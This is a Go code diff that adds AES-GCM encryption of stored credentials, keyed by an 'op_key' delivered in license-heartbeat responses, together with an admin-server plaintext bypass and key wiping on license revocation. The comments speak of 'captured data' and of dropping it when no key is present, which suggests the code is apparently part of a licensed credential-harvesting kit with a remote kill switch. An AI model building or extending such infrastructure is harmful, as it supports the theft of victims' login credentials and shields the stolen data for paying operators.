@@ -3,8 +3,11 @@ package core
 import (
 	"bufio"
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/ed25519"
 	"crypto/hmac"
+	crand "crypto/rand"
 	"crypto/sha256"
 	"encoding/base64"
 	"encoding/hex"
@@ -18,6 +21,7 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"time"
 )
@@ -29,8 +33,10 @@ var licenseState int32 = 1
 // MarkRevoked transitions the license state to invalid. Called from the
 // revocation and heartbeat goroutines in main.go before they call os.Exit,
 // so that any distributed assertActive() call that races the exit also fires.
+// Also wipes the session key so no further credentials can be encrypted.
 func MarkRevoked() {
 	atomic.StoreInt32(&licenseState, 0)
+	ClearSessionKey()
 }
 
 // assertActive exits immediately when the license has been revoked or a
@@ -40,6 +46,107 @@ func assertActive() {
 	if atomic.LoadInt32(&licenseState) == 0 {
 		os.Exit(1)
 	}
+}
+
+// sessionKeyMu guards sessionKeyBytes and adminBypassMode.
+var sessionKeyMu sync.RWMutex
+var sessionKeyBytes []byte
+var adminBypassMode bool
+
+// SetAdminBypass disables credential encryption on the admin VPS (which never
+// receives heartbeats and therefore never gets a session key).
+func SetAdminBypass() {
+	sessionKeyMu.Lock()
+	adminBypassMode = true
+	sessionKeyMu.Unlock()
+}
+
+// SetSessionKey stores the AES-256 key received from the heartbeat server.
+// hexKey must be exactly 64 hex characters (32 bytes).
+func SetSessionKey(hexKey string) {
+	b, err := hex.DecodeString(hexKey)
+	if err != nil || len(b) != 32 {
+		return
+	}
+	sessionKeyMu.Lock()
+	sessionKeyBytes = b
+	sessionKeyMu.Unlock()
+}
+
+// ClearSessionKey wipes the in-memory session key. After this call
+// EncryptCredential returns "" until the next successful heartbeat.
+func ClearSessionKey() {
+	sessionKeyMu.Lock()
+	sessionKeyBytes = nil
+	sessionKeyMu.Unlock()
+}
+
+// EncryptCredential encrypts plaintext with AES-256-GCM using the current
+// session key and returns "enc:<hex(nonce||ciphertext)>". Returns "" when no
+// key is available (caller should skip the DB write). Returns plaintext as-is
+// on the admin VPS (adminBypassMode).
+func EncryptCredential(plaintext string) string {
+	sessionKeyMu.RLock()
+	bypass := adminBypassMode
+	key := sessionKeyBytes
+	sessionKeyMu.RUnlock()
+
+	if bypass {
+		return plaintext
+	}
+	if key == nil {
+		return "" // no key yet — drop the write
+	}
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return ""
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return ""
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := io.ReadFull(crand.Reader, nonce); err != nil {
+		return ""
+	}
+	ct := gcm.Seal(nonce, nonce, []byte(plaintext), nil)
+	return "enc:" + hex.EncodeToString(ct)
+}
+
+// DecryptCredential reverses EncryptCredential. Values without the "enc:" prefix
+// (old unencrypted sessions or admin-bypass writes) are returned as-is.
+// Returns the original string on decryption failure.
+func DecryptCredential(s string) string {
+	if !strings.HasPrefix(s, "enc:") {
+		return s
+	}
+	data, err := hex.DecodeString(s[4:])
+	if err != nil {
+		return s
+	}
+	sessionKeyMu.RLock()
+	key := sessionKeyBytes
+	sessionKeyMu.RUnlock()
+	if key == nil {
+		return "(encrypted)"
+	}
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return s
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return s
+	}
+	ns := gcm.NonceSize()
+	if len(data) < ns {
+		return s
+	}
+	pt, err := gcm.Open(nil, data[:ns], data[ns:], nil)
+	if err != nil {
+		return "(encrypted)"
+	}
+	return string(pt)
 }
 
 type licensePayload struct {
@@ -402,9 +509,19 @@ func SendHeartbeat(token, heartbeatURL string) error {
 		if err != nil {
 			continue // fail open on network error
 		}
-		resp.Body.Close()
 		if resp.StatusCode == http.StatusForbidden {
+			resp.Body.Close()
 			return errors.New("license has been revoked — contact the admin for a new key")
+		}
+		// Parse op_key from the successful heartbeat response and store it in memory.
+		// This key gates credential encryption — without it, captured data is dropped.
+		var hbResp struct {
+			OpKey string `json:"op_key"`
+		}
+		_ = json.NewDecoder(io.LimitReader(resp.Body, 1024)).Decode(&hbResp)
+		resp.Body.Close()
+		if hbResp.OpKey != "" {
+			SetSessionKey(hbResp.OpKey)
 		}
 	}
 	return nil
